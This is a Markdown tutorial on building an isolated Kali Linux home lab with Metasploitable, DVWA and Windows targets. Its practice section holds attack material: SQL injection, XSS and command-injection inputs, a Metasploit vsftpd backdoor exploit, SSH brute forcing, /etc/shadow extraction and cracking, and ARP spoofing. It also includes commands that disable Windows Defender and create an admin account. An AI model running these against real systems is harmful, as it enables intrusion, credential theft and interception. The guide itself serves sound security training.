# 🔐 Complete Kali Linux Home Lab Setup Guide

## 📋 Table of Contents
1. [Hardware Requirements](#hardware-requirements)
2. [Software Requirements](#software-requirements)
3. [Lab Architecture](#lab-architecture)
4. [Step-by-Step Setup](#step-by-step-setup)
5. [Vulnerable Machines Setup](#vulnerable-machines-setup)
6. [Network Configuration](#network-configuration)
7. [Essential Tools Configuration](#essential-tools-configuration)
8. [Practice Scenarios](#practice-scenarios)

---

## 💻 Hardware Requirements

### Minimum Specs
- **CPU**: Intel i5 or AMD Ryzen 5 (4 cores)
- **RAM**: 16GB (8GB minimum, but 16GB+ recommended)
- **Storage**: 250GB SSD
- **Network**: Ethernet or WiFi adapter

### Recommended Specs
- **CPU**: Intel i7/i9 or AMD Ryzen 7/9 (6+ cores)
- **RAM**: 32GB or more
- **Storage**: 500GB+ SSD
- **Network**: Dual network adapters (for isolated lab network)

---

## 📦 Software Requirements

### Hypervisor Options

#### Option 1: VMware Workstation Pro/Player (Recommended)
- **Download**: https://www.vmware.com/products/workstation-player.html
- **Pros**: Better performance, snapshots, network flexibility
- **Cost**: Player is free, Pro has more features

#### Option 2: VirtualBox (Free)
- **Download**: https://www.virtualbox.org/
- **Pros**: Free, open-source, cross-platform
- **Cons**: Slightly slower than VMware

#### Option 3: Hyper-V (Windows Pro/Enterprise)
- **Built into Windows**: Enable via Windows Features
- **Pros**: Native Windows integration
- **Cons**: Windows-only

### Virtual Machines Needed
1. **Kali Linux** (Attacker machine)
2. **Metasploitable 2/3** (Vulnerable Linux)
3. **DVWA** (Damn Vulnerable Web Application)
4. **Windows 10/11** (Target machine)
5. **Windows Server 2019/2022** (Domain Controller - optional)
6. **Ubuntu Server** (For various services)

---

## 🏗️ Lab Architecture

```
┌─────────────────────────────────────────────────────────┐
│                    Host Machine                          │
│  (Your Physical Computer - Windows/Linux/Mac)           │
└─────────────────────────────────────────────────────────┘
                          │
                          │ Hypervisor (VMware/VirtualBox)
                          │
        ┌─────────────────┴─────────────────┐
        │                                   │
        │    Virtual Network (NAT/Host-Only) │
        │                                   │
        └─────────────────┬─────────────────┘
                          │
        ┌─────────────────┼─────────────────┬──────────────┐
        │                 │                 │              │
   ┌────▼────┐      ┌────▼────┐      ┌────▼────┐   ┌────▼────┐
   │  Kali   │      │ Metaspl │      │ Windows │   │  DVWA   │
   │  Linux  │      │ oitable │      │   10    │   │  (Web)  │
   │         │      │         │      │         │   │         │
   │ Attacker│      │ Victim  │      │ Victim  │   │ Victim  │
   └─────────┘      └─────────┘      └─────────┘   └─────────┘
```

---

## 🚀 Step-by-Step Setup

### Step 1: Install Hypervisor

#### For VMware Workstation Player:
```bash
# Download from official site
# Install with default settings
# Restart computer after installation
```

#### For VirtualBox:
```bash
# Download from official site
# Install VirtualBox and Extension Pack
# Restart computer
```

---

### Step 2: Download Required ISOs/VMs

#### Kali Linux
```bash
# Official Download
URL: https://www.kali.org/get-kali/#kali-virtual-machines

# Download Pre-built VM (Recommended)
- VMware: kali-linux-2024.x-vmware-amd64.7z
- VirtualBox: kali-linux-2024.x-virtualbox-amd64.7z

# Or Download ISO for custom install
- kali-linux-2024.x-installer-amd64.iso
```

#### Metasploitable 2
```bash
URL: https://sourceforge.net/projects/metasploitable/files/Metasploitable2/
File: metasploitable-linux-2.0.0.zip

# Extract and import into VMware/VirtualBox
```

#### Metasploitable 3
```bash
# GitHub Repository
URL: https://github.com/rapid7/metasploitable3

# Build using Vagrant (Advanced)
# Or download pre-built from community sources
```

#### DVWA (Damn Vulnerable Web Application)
```bash
# Option 1: Docker (Easiest)
docker pull vulnerables/web-dvwa

# Option 2: Manual Install on Ubuntu VM
git clone https://github.com/digininja/DVWA.git
```

#### Windows 10/11 Evaluation
```bash
URL: https://www.microsoft.com/en-us/evalcenter/evaluate-windows-10-enterprise
# 90-day trial, can be reset with snapshots
```

---

### Step 3: Set Up Kali Linux VM

#### Import Pre-built VM:
1. Extract downloaded 7z file
2. Open VMware/VirtualBox
3. File → Open → Select .vmx (VMware) or .vbox (VirtualBox)
4. Configure VM settings:
   - **RAM**: 4GB minimum, 8GB recommended
   - **CPU**: 2 cores minimum, 4 recommended
   - **Network**: NAT or Host-Only
   - **Disk**: 80GB (expandable)

#### First Boot Configuration:
```bash
# Default credentials
Username: kali
Password: kali

# First commands after login
sudo apt update
sudo apt upgrade -y
sudo apt dist-upgrade -y

# Install additional tools
sudo apt install -y \
    terminator \
    tmux \
    vim \
    git \
    curl \
    wget \
    python3-pip \
    docker.io \
    virtualenv

# Enable and start services
sudo systemctl enable ssh
sudo systemctl start ssh
sudo systemctl enable postgresql
sudo systemctl start postgresql
```

---

### Step 4: Set Up Metasploitable 2

#### Import VM:
1. Extract metasploitable-linux-2.0.0.zip
2. In VMware: File → Open → Select .vmx file
3. In VirtualBox: File → Import Appliance → Select .ovf file

#### Configure:
```bash
# VM Settings
RAM: 512MB (sufficient)
CPU: 1 core
Network: Host-Only or NAT (same network as Kali)

# Default credentials
Username: msfadmin
Password: msfadmin

# After boot, get IP address
ifconfig
# Note the IP address (e.g., 192.168.x.x)
```

---

### Step 5: Set Up DVWA

#### Option A: Docker (Recommended)
```bash
# On Kali Linux or separate Ubuntu VM
sudo docker pull vulnerables/web-dvwa
sudo docker run -d -p 80:80 vulnerables/web-dvwa

# Access at: http://localhost or http://VM-IP
# Default credentials: admin/password
```

#### Option B: Manual Install on Ubuntu
```bash
# Create Ubuntu Server VM (2GB RAM, 1 CPU)
# After Ubuntu installation:

sudo apt update
sudo apt install -y apache2 mysql-server php php-mysqli php-gd libapache2-mod-php

# Download DVWA
cd /var/www/html
sudo git clone https://github.com/digininja/DVWA.git
sudo chown -R www-data:www-data DVWA

# Configure database
sudo mysql
CREATE DATABASE dvwa;
CREATE USER 'dvwa'@'localhost' IDENTIFIED BY 'p@ssw0rd';
GRANT ALL PRIVILEGES ON dvwa.* TO 'dvwa'@'localhost';
FLUSH PRIVILEGES;
EXIT;

# Configure DVWA
cd /var/www/html/DVWA/config
sudo cp config.inc.php.dist config.inc.php
sudo nano config.inc.php
# Update database credentials

# Restart Apache
sudo systemctl restart apache2

# Access: http://VM-IP/DVWA
# Click "Create/Reset Database"
# Login: admin/password
```

---

### Step 6: Set Up Windows 10 Target

#### Create VM:
1. Create new VM in VMware/VirtualBox
2. Select Windows 10 ISO
3. Configure:
   - **RAM**: 4GB minimum
   - **CPU**: 2 cores
   - **Disk**: 60GB
   - **Network**: Same network as Kali

#### Post-Installation:
```powershell
# Disable Windows Defender (for lab only!)
Set-MpPreference -DisableRealtimeMonitoring $true

# Enable RDP
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -value 0
Enable-NetFirewallRule -DisplayGroup "Remote Desktop"

# Create vulnerable user
net user labuser Password123! /add
net localgroup administrators labuser /add

# Install vulnerable software (for practice)
# - Old Java versions
# - Adobe Reader (older version)
# - FileZilla Server
```

---

## 🌐 Network Configuration

### Option 1: NAT Network (Internet Access)
```
Kali Linux → NAT → Internet
Metasploitable → NAT → Internet
DVWA → NAT → Internet

Pros: VMs can access internet
Cons: Less isolated, potential security risk
```

### Option 2: Host-Only Network (Isolated - Recommended)
```
Kali Linux → Host-Only → Host Machine
Metasploitable → Host-Only → Host Machine
DVWA → Host-Only → Host Machine

Pros: Completely isolated, safe for malware testing
Cons: No internet access (use NAT adapter as secondary)
```

### Option 3: Dual Network (Best of Both)
```
Each VM has TWO network adapters:
- Adapter 1: NAT (for internet/updates)
- Adapter 2: Host-Only (for lab communication)

This is the RECOMMENDED setup!
```

#### Configure in VMware:
```
VM Settings → Network Adapter
- Adapter 1: NAT
- Add → Network Adapter → Adapter 2: Host-Only (VMnet1)
```

#### Configure in VirtualBox:
```
VM Settings → Network
- Adapter 1: NAT
- Adapter 2: Host-Only Adapter (vboxnet0)
```

---

## 🛠️ Essential Tools Configuration

### Metasploit Framework
```bash
# Initialize database
sudo msfdb init

# Start Metasploit
msfconsole

# Update Metasploit
sudo apt update
sudo apt install metasploit-framework
```

### Burp Suite
```bash
# Already installed in Kali
# Launch from Applications → Web Application Analysis → Burp Suite

# Configure browser proxy
# Firefox: Preferences → Network Settings
# Manual proxy: 127.0.0.1:8080
```

### Nmap
```bash
# Already installed, verify
nmap --version

# Basic network scan
nmap -sn 192.168.x.0/24  # Replace with your network

# Comprehensive scan
nmap -A -T4 <target-ip>
```

### Wireshark
```bash
# Already installed
# Launch: Applications → Sniffing & Spoofing → Wireshark

# Capture on correct interface (eth0 or eth1)
```

### John the Ripper
```bash
# Already installed
john --version

# Basic usage
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

### Hydra
```bash
# Already installed
hydra -h

# Example SSH brute force
hydra -l user -P /usr/share/wordlists/rockyou.txt ssh://192.168.x.x
```

---

## 🎯 Practice Scenarios

### Scenario 1: Network Reconnaissance
```bash
# 1. Discover live hosts
nmap -sn 192.168.x.0/24

# 2. Port scan target
nmap -p- -T4 <target-ip>

# 3. Service enumeration
nmap -sV -sC <target-ip>

# 4. OS detection
nmap -O <target-ip>
```

### Scenario 2: Exploit Metasploitable 2
```bash
# Start Metasploit
msfconsole

# Search for exploits
search vsftpd

# Use exploit
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS <metasploitable-ip>
exploit

# You should get a shell!
```

### Scenario 3: Web Application Testing (DVWA)
```bash
# 1. Set DVWA security to "Low"
# 2. Test SQL Injection
# Input: ' OR '1'='1
# Input: ' OR '1'='1' --
# Input: ' UNION SELECT null, version() --

# 3. Test XSS
# Input: <script>alert('XSS')</script>

# 4. Test Command Injection
# Input: 127.0.0.1; ls -la
# Input: 127.0.0.1 && whoami
```

### Scenario 4: Password Cracking
```bash
# 1. Extract password hashes from Metasploitable
# SSH into Metasploitable
ssh msfadmin@<metasploitable-ip>
cat /etc/shadow > shadow.txt

# 2. Transfer to Kali
scp msfadmin@<metasploitable-ip>:shadow.txt .

# 3. Crack with John
john --wordlist=/usr/share/wordlists/rockyou.txt shadow.txt

# 4. Show cracked passwords
john --show shadow.txt
```

### Scenario 5: Man-in-the-Middle Attack
```bash
# 1. Enable IP forwarding
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward

# 2. ARP spoofing with ettercap
sudo ettercap -T -M arp:remote /<gateway-ip>// /<target-ip>//

# 3. Capture traffic with Wireshark
# Start capture on eth0

# 4. Analyze captured packets
```

---

## 📸 Snapshot Strategy

### Create Snapshots at Key Points:
```
1. Fresh Install - Clean state
2. Fully Updated - After all updates
3. Tools Configured - After tool setup
4. Before Testing - Clean slate for each test
5. After Compromise - Document successful exploits
```

### VMware Snapshots:
```
VM → Snapshot → Take Snapshot
Name: "Clean Install - Date"
Description: "Fresh Kali install, all updates applied"
```

### VirtualBox Snapshots:
```
Machine → Take Snapshot
Name: "Clean State"
```

---

## 🔒 Security Best Practices

### 1. Isolation
- ✅ Use Host-Only network for lab
- ✅ Never connect lab VMs directly to internet
- ✅ Use NAT only for updates, then disconnect

### 2. Snapshots
- ✅ Take snapshots before major changes
- ✅ Revert to clean state regularly
- ✅ Document each snapshot purpose

### 3. Credentials
- ✅ Use default credentials for lab VMs
- ✅ Document all passwords
- ✅ Never use real passwords in lab

### 4. Malware Testing
- ✅ Only test malware in isolated environment
- ✅ Never connect infected VMs to internet
- ✅ Use snapshots before malware testing

---

## 📚 Additional Resources

### Vulnerable VMs
- **VulnHub**: https://www.vulnhub.com/
- **HackTheBox**: https://www.hackthebox.com/
- **TryHackMe**: https://tryhackme.com/
- **PentesterLab**: https://pentesterlab.com/

### Learning Platforms
- **Offensive Security**: https://www.offensive-security.com/
- **SANS Cyber Aces**: https://www.cyberaces.org/
- **Cybrary**: https://www.cybrary.it/

### Documentation
- **Kali Docs**: https://www.kali.org/docs/
- **Metasploit Unleashed**: https://www.offensive-security.com/metasploit-unleashed/
- **OWASP**: https://owasp.org/

---

## ✅ Lab Setup Checklist

- [ ] Hypervisor installed (VMware/VirtualBox)
- [ ] Kali Linux VM created and updated
- [ ] Metasploitable 2 VM imported
- [ ] DVWA installed and accessible
- [ ] Windows 10 target VM created
- [ ] Network configured (dual adapter setup)
- [ ] All VMs can ping each other
- [ ] Snapshots created for all VMs
- [ ] Essential tools tested (nmap, metasploit, burp)
- [ ] First successful exploit completed

---

## 🎓 Next Steps

1. **Complete basic reconnaissance** on all targets
2. **Document findings** in a lab notebook
3. **Practice exploits** from Metasploit
4. **Test web vulnerabilities** in DVWA
5. **Create incident response scenarios**
6. **Build detection rules** for attacks
7. **Practice forensics** on compromised systems

---

**Your Kali Linux home lab is now ready for hands-on cybersecurity practice! 🚀**
